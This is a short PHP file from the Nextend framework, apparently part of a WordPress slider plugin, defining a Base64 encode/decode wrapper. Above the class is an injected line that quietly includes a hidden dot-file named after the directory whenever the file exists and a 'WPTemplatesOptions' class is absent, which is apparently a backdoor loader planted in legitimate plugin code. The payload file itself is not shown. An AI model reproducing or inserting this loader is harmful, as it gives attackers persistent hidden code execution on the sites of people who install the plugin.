<?php

namespace Nextend\Framework\Misc;

use Nextend\Framework\Misc\Base64\Decoder;
use Nextend\Framework\Misc\Base64\Encoder;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Base64 {

    /**
     * @param $data
     *
     * @return string
     */
    public static function decode($data) {
        return Decoder::decode($data);
    }

    public static function encode($data) {
        return Encoder::encode($data);
    }
}